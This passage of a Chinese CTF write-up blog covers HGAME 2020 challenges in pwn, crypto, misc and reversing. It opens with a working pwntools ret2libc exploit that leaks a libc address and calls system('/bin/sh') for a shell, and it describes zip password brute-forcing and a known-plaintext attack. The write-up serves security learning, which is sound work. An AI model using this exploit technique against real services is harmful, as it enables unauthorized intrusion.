id="解题思路：-7"><a href="#解题思路：-7" class="headerlink" title="解题思路："></a>解题思路：</h4><p>预期解应该是溢出然后写shellcode利用orw得到读flag，但是，ROP is PWNers’ romance，</p><p>所以这里我利用的还是上一题的ret2libc，应该是非预期了。</p><p>首先这里会读0x100个字符进v5，但是v5在栈里的位置</p><p>距离栈底指针只有0x50个字符，所以这里肯定是存在栈溢出的，然后如上题一样的操作（出题人出题用的同一个环境，所以脚本几乎可以直接搬来）</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"ROP_LEVEL0"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./ROP_LEVEL0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="string">'a'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    </span><br><span class="line">    payload+=p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">   </span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#和上一题一样~</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line">    buf = <span class="string">'A'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)</span><br><span class="line">    payload+=p64(sh_addr)#system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">    payload+=p64(system_addr)#system()</span><br><span class="line">    payload+=p64(<span class="number">0</span>xdeadbeef)#这里无所谓了，我们都getshell了，返回地址随便填了</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line"></span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20003"</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lnfantRSA"><a href="#lnfantRSA" class="headerlink" title="lnfantRSA"></a>lnfantRSA</h3><h4 id="题目介绍：-8"><a href="#题目介绍：-8" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>真*签到题<br>p = 681782737450022065655472455411;<br>q = 675274897132088253519831953441;<br>e = 13;<br>c = pow(m,e,p*q) = 275698465082361070145173688411496311542172902608559859019841</p><h4 id="解题思路：-8"><a href="#解题思路：-8" class="headerlink" title="解题思路："></a>解题思路：</h4><p>知道所有的条件了，我们只需要算出私钥d就可以解密了，私钥d是公钥在模φ(n)，即是这里的φ(p<em>q)=(p-1)\</em>(q-1)</p><p>直接用gmpy2模块下的invert可以求出私钥来，d=gmpy2.invert(e,(p-1)*(q-1))</p><p>然后m（即flag）为：m=pow(c,d,p*q)</p><p>这里解密方程的证明：</p><p><img src="https://i.loli.net/2020/04/30/KAPMGRlaoXguwDx.png" alt="img"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 681782737450022065655472455411;</span><br><span class="line">q = 675274897132088253519831953441;</span><br><span class="line">e = 13;</span><br><span class="line">c = 275698465082361070145173688411496311542172902608559859019841</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">m = pow(c,int(d),p*q)</span><br><span class="line">print hex(m)[2:-1].decode('hex')</span><br></pre></td></tr></table></figure><p>flag:hgame{t3Xt6O0k_R5A!!!}</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><h4 id="题目介绍：-9"><a href="#题目介绍：-9" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>Some basic modular arithmetic…</p><h4 id="解题思路：-9"><a href="#解题思路：-9" class="headerlink" title="解题思路："></a>解题思路：</h4><p>加密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> A, B, flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">'hgame&#123;'</span>) <span class="keyword">and</span> flag.endswith(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = len(TABLE)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> flag:</span><br><span class="line">    i = TABLE.find(b)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        cipher += b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ii = (A*i + B) % MOD</span><br><span class="line">        cipher += TABLE[ii]</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>是拓展了字符表的仿射加密 </p><p>我们可以知道放射加密的公式是：c≡Ax+B （mod m）其中，x为明文，c为密文，m为模数，这里m=len(TABLE)</p><p>所以对应的解密公式即为：x≡(c-B) * A ^-1^ (mod m)，这里，A^-1^是A在模m下的逆元，（如rsa中d是e在模φ(n)下的逆元一般），</p><p>题目中，我不知道A，B，所以我选择爆破A,B的方法，然后在所有答案中找包含字符‘hgame’的结果。（因为知道flag中前五个字符为hgame，所以其实也可以解方程，但是因为TABLE比较小，为了抢个一血，就直接爆了，甚至脚本也是在原基础上直接改的）</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = <span class="number">62</span></span><br><span class="line"><span class="keyword">for</span> A <span class="keyword">in</span> range(MOD):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> B <span class="keyword">in</span> range(MOD):</span><br><span class="line">        flag=<span class="string">""</span></span><br><span class="line">        cipher = <span class="string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> cipher:</span><br><span class="line">            i = TABLE.find(b)</span><br><span class="line">            <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">                flag += b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                try:</span><br><span class="line">                    ii = (i-B)*invert(A,MOD)%MOD</span><br><span class="line">                    flag += TABLE[ii]</span><br><span class="line">                except:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print flag</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>flag：hgame{M4th_u5Ed_iN_cRYpt0}</p><h3 id="not-One-time"><a href="#not-One-time" class="headerlink" title="not_One_time"></a>not_One_time</h3><h4 id="题目介绍：-10"><a href="#题目介绍：-10" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but…<br>Just XOR ;P<br>nc 47.98.192.231 25001<br>hint: reduced key space</p><h4 id="解题思路：-10"><a href="#解题思路：-10" class="headerlink" title="解题思路："></a>解题思路：</h4><p>一次性密码本本身无解，程序漏洞在于key的空间被缩减了，可以多次连接获取密文文本，此时一直不变的flag反而可以看作是用来加密的key了。然后爆破flag，使得flag的每一位能解密 <strong>密文文本</strong> 的<strong>每一项</strong>的对应位，解密成功的判断条件是恢复出的明文在给出的key的空间中。</p><p>举个栗子：</p><p> flag的第一个字符肯定是h吧， </p><p>比如我们连接20次，获得20组密文，</p><p> h和每一组的密文的第一个字符异或，肯定也是一个可见字符， 并且20组异或下来，获得的可见字符肯定也是20个，不会少一个。</p><p>所以我们只需要遍历所有的密钥空间内的元素，找到满足条件（即，和20组密文的对应位异或下来能生成20个可见字符）的字符，组合起来即为flag</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">import <span class="keyword">string</span>, binascii, base64</span><br><span class="line"></span><br><span class="line">def getex():</span><br><span class="line">    example=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        p=remote(<span class="string">'47.98.192.231'</span>,<span class="number">25001</span>)</span><br><span class="line">        example.append(base64.b64decode(p.recv()))</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">    <span class="literal">return</span> example</span><br><span class="line"></span><br><span class="line">ex=getex()<span class="comment">#获取50组密文</span></span><br><span class="line"></span><br><span class="line">tablekey=<span class="keyword">string</span>.ascii_letters+<span class="keyword">string</span>.digits</span><br><span class="line">tableflag=tablekey+<span class="string">'~!@#$%^&amp;*()_+-=`&#123;&#125;'</span>  <span class="comment">#flag的可能的字符</span></span><br><span class="line">flag=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="built_in">len</span>(ex[<span class="number">0</span>])):</span><br><span class="line">    flag_may=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tableflag:</span><br><span class="line">        possible=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ex:</span><br><span class="line">            <span class="keyword">a</span> = chr(ord(i)^ord(j[index]))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">a</span> <span class="keyword">in</span> tablekey:<span class="comment">#如果异或结果是在密钥空间里的话，将结果放入数组</span></span><br><span class="line">                possible.append(<span class="keyword">a</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(possi) == <span class="built_in">len</span>(ex):<span class="comment">#如果数组长度等于密钥的组数（这里的50）</span></span><br><span class="line">            flag_may+=i<span class="comment">#该字符符合条件，放入该位候选（因为有可能一个位置有多个字符满足条件，可能需要二次排除）</span></span><br><span class="line">    flag.append(flag_may) </span><br><span class="line">print flag<span class="comment">#看每一组是否只有一个字符，如果不是的话，多跑几遍脚本，取个交集就可。</span></span><br><span class="line">flag_string=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">flag_string+=i</span><br><span class="line">print flag_string</span><br></pre></td></tr></table></figure><p>hgame{r3us1nG+M3$5age-&amp;&amp;~rEduC3d_k3Y-5P4Ce}</p><h3 id="Recoder"><a href="#Recoder" class="headerlink" title="Recoder"></a>Recoder</h3><h4 id="题目介绍：-11"><a href="#题目介绍：-11" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>We found a secret oracle and it looks like it will encrypt your input…<br>nc 47.98.192.231 25002</p><h4 id="解题思路：-11"><a href="#解题思路：-11" class="headerlink" title="解题思路："></a>解题思路：</h4><p>根据题目名字，再经过多次尝试可以发现，服务器会将你的输入进行简单的置换，</p><p>然后在交互十次之后会给出置换后的flag，长度为32位</p><p><img src="https://i.loli.net/2020/04/30/q7slBzN4kjL9uEA.png" alt="img"></p><p>那么我们只需要输入32位字符，观察他置换后结果，得到映射关系，然后我们根据这个映射关系，将最后给出的置换过后的flag置换回来即可。(注意，为了让我们的映射关系为一一映射，即映射关系为双射关系，我们的输入应该是<strong>不重复</strong>的字符)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cin</span>=<span class="string">'qhaufsywetodiprgjYQvRWcklxnEbmzT'</span></span><br><span class="line"><span class="attribute">cout</span>=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTY'</span></span><br><span class="line"><span class="attribute">flagout</span>=<span class="string">'hL+jm5&#123;gae$IUtmp3&#125;iu!0m_PRAnTTe!'</span></span><br><span class="line">index=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cout :</span><br><span class="line">index.append(cin.<span class="builtin-name">find</span>(i))</span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(32):</span><br><span class="line">flag+=flagout[index[i]]</span><br><span class="line"><span class="builtin-name">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><h4 id="题目介绍：-12"><a href="#题目介绍：-12" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>欢迎大家参加 HGAME 2020！<br>来来来，签个到吧～<br>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t<br>注：若解题得到的是无<code>hgame{}</code>字样的flag花括号内内容，请手动添加<code>hgame{}</code>后提交。<br>【Notice】解出来的字母均为大写</p><h4 id="解题思路：-12"><a href="#解题思路：-12" class="headerlink" title="解题思路："></a>解题思路：</h4><p>将题目base64解码后为：.– …– .-.. -.-. —– – . ..–.- - — ..–.- ..— —– ..— —– ..–.- …. –. .- – …–</p><p>根据提示，摩斯密码解密：W3LC0ME_TO_2020_HGAM3</p><p>flag：hgame{W3LC0ME_TO_2020_HGAM3}</p><p>这里推荐一个摩斯密码在线解密的比较好的网站： <a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d" target="_blank" rel="noopener">http://www.all-tool.cn/Tools/morse/?&amp;rand=ef0d1baeafb128b559d9813277b7ca5d</a> ，可以自定义 分割符，长符，短符</p><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><h4 id="题目介绍：-13"><a href="#题目介绍：-13" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>某天，ObjectNotFound给你发来了一个压缩包。<br>“给你一张我的新老婆的壁纸！怎样，好看吗？”<br>正当你疑惑不解的时候，你突然注意到了压缩文件的名字——“Secret”。<br>莫非其中暗藏玄机？</p><h4 id="解题思路：-13"><a href="#解题思路：-13" class="headerlink" title="解题思路："></a>解题思路：</h4><p>拿到文件，是个图片，</p><p>能天使~</p><p>放入010editor，ctrl f 搜索hex值：50 4b 03 04（这是压缩包的文件头）可以看见图片底部有压缩包，</p><p>我们手动将zip包导出来，</p><p>首先选中自这个文件头往后的所有内容，右键-&gt;选择-&gt;保存选择</p><p>改文件后缀名为zip</p><p>打开压缩包</p><p>提示压缩包密码是个ID，这张图片的ID？不知道，直接爆6-8位数字试试先！得到</p><p>得到：\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</p><p>看到最后一个7d，‘}’的ascii码的十六进制，flag出来了~</p><p>十六进制转字符串得到flag：hgame{Do_y0u_KnOW_uNiC0d3?}</p><p>呃，，是unicode么原来。。。。</p><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><h4 id="题目介绍：-14"><a href="#题目介绍：-14" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>ObjectNotFound几天前随手从Cosmos电脑桌面上复制下来的文件。<br>唔，好像里面有什么不得了的东西。<br>【hint1】请使用7zip。另外，加密的zip是无法解出密码的。</p><h4 id="解题思路：-14"><a href="#解题思路：-14" class="headerlink" title="解题思路："></a>解题思路：</h4><p>下载得到压缩包，里面有一个加密得压缩包和一个文件，Bacon.txt,</p><p>文本文件得内容是：</p><p>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.</p><p>*Password in capital letters.</p><p>是培根密码得一种形式，根据大小写来解密，</p><p>先将大写得字符转位a，小写得字母转为b，</p><p>bbabababaabbbbbbbaabbbaaababbbbbbaabbbaabbabbbaabababbbbaababbbaabaaabbbbab</p><p>然后找一个<a href="https://tool.bugku.com/peigen/" target="_blank" rel="noopener">在线网站解密</a></p><p>解密失败</p><p>那就a,b互换</p><p>aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba</p><p>得到</p><p>FLAGHIDDENINDOC<br>flaghiddenindoc</p><p>会是压缩包得密码么？</p><p>打开压缩包</p><p>可以发现里面也有一个Bacon.txt</p><p>加上提示说用7z进行压缩，应该是明文攻击了实锤了。</p><p>然后明文攻击获得无密码压缩包。</p><p>先将已经得到得Bacon.txt用7z无密码压缩得到Bacon.zip</p><p>利用工具：ARCHPR</p><p>上面放有密码得压缩包，下面放自己制作得压缩包</p><p>开始攻击，</p><p>等搜索到密钥后就可以手动暂停，获得无密码的压缩包</p><p>有这个密钥就可以获得无密码的压缩包了，点确定就可以了。    </p><p>打开word，提示有密码，密码是什么？刚刚有解密过一个培根密码惹，试试</p><p>最后试出来是大写的那个：FLAGHIDDENINDOC</p><p>打开是一篇文章</p><p>拉到底也没发现东西，</p><p>以为是将flag设置成和背景一样的白色，于是将所有文字都改成红色。无果</p><p>最后试了试设计模式，这个模式也可以藏些信息（之前的比赛遇到过）</p><p>果然~</p><p>得到flag：hgame {Y0u_h@Ve_F0Und_mY_S3cReT}</p><h3 id="签到提ProPlus"><a href="#签到提ProPlus" class="headerlink" title="签到提ProPlus"></a>签到提ProPlus</h3><h4 id="题目介绍：-15"><a href="#题目介绍：-15" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>什么什么，签到题太简单没过瘾？<br>来来来，试试咱ObjectNotFound亲手做的这一道，包您满意！<br>【拼写错误修正】fenses -&gt; fences</p><h4 id="解题思路：-15"><a href="#解题思路：-15" class="headerlink" title="解题思路："></a>解题思路：</h4><p>打开文件，有一个加密的压缩包和一个password.txt，</p><p>文本内容为：</p><p>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</p><p>JRFVJYFZVRUAGMAI</p><ul><li>Three fenses first, Five Caesar next. English sentense first,  zip password next.</li></ul><p>推荐一个编码解码比较好的网站：<a href="http://www.qqxiuzi.cn" target="_blank" rel="noopener">www.qqxiuzi.cn</a></p><p>三次栅栏，五次凯撒   英语句子在前，压缩包密码在后，</p><p>先将文本每组字数为3栅栏解密后，凯撒密码位移5位解密得到</p><p> Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice. </p><p>百年孤独里的一段，</p><p>emmm，所以下面那个JRFVJYFZVRUAGMAI有什么用呢？</p><p>English sentense first,  zip password next.</p><p>所以将这一串按同样规则解密就能得到zip密码了，</p><p>解密得到： EAVMUBAQHQMVEPDT </p><p>用这个密码打开压缩包</p><p>是ook！加密，<a href="https://www.splitbrain.org/services/ook解密得到base32编码，" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook解密得到base32编码，</a></p><p>base32解码得到base64编码，base64解码得到</p><p><img src="https://i.loli.net/2020/04/30/3r1lGqF2ubkRJV4.png" alt="img"></p><p>可以看到，png文件的文件头PNG，</p><p>于是用python，将base64转为图片</p><p>exp：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">base=<span class="string">'    '</span> <span class="comment">#这里是之前得到的base64编码</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(base64.b64decode(base))</span><br></pre></td></tr></table></figure><p>得到二维码-&gt;flag： hgame{3Nc0dInG_@lL_iN_0Ne!} </p><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><h4 id="题目介绍：-16"><a href="#题目介绍：-16" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p>“这是一个，E99p1ant和ObjectNotFound之间发生的故事。”<br>“事情，还要从一个风和日丽的下午说起。ObjectNotFound正听着网易云每日推荐…”<br>算了算了，想不出什么题目介绍了，就这样吧。</p><h4 id="解题思路：-16"><a href="#解题思路：-16" class="headerlink" title="解题思路："></a>解题思路：</h4><p>用wireshark打开流量包，追踪TCP流，</p><p>在第88流发现出题人上传的压缩包</p><p>dump下来，这里提供一种我的稍微比较麻烦的方法，如果有更好的方法，请指教</p><p>首先显示和保存数据为原始数据</p><p>然后新建一个空的文本，将这些数据复制进去，保存</p><p>打开010editor，导入16进制文件ii</p><p>编辑为文本</p><p>删掉压缩包前面和后面的报文，保存文件，后缀为.zip</p><p>打开压缩包，提示密码为6位数字</p><p>ARCHPR爆破之。</p><p>打开得到一个音频</p><p>I Love Mondays.mp3</p><p>听了一下，里面确实是原来的曲，</p><p>一开始觉得可能是mp3隐写，但是找不到密码，最后还是用Audacity打开，试了试</p><p>波形图，</p><p>无果，</p><p>试了试频谱图</p><p><img src="https://i.loli.net/2020/04/30/T1eRzlhCiGHym8b.png" alt="img"></p><p>得到flag：hgame{I_love_EDM233}</p><p>（好奇这种题怎么出的，出题人好强~）</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><h4 id="题目介绍：-17"><a href="#题目介绍：-17" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p> You won’t figure out anything if you give in to fear.<br>学习资料: <a href="https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/reverse/maze/maze-zh/</a><br>附加说明：请走最短路线 </p><h4 id="解题思路：-17"><a href="#解题思路：-17" class="headerlink" title="解题思路："></a>解题思路：</h4><p>是一个正常的走迷宫，先看走法那边的代码</p><p>迷宫就在图中的&amp;unk_602080，</p><p>终点就是图中的&amp;unk_60243C.</p><p>我们在ida里面把迷宫dump下来</p><p>选中迷宫数据段</p><p>shift+e</p><p>从反汇编的代码我们可以看出，这个迷宫有64列，但是左右移动一次都是移动四位，所以我们把迷宫处理一下，</p><p>每四列只取第一列左右有效列</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 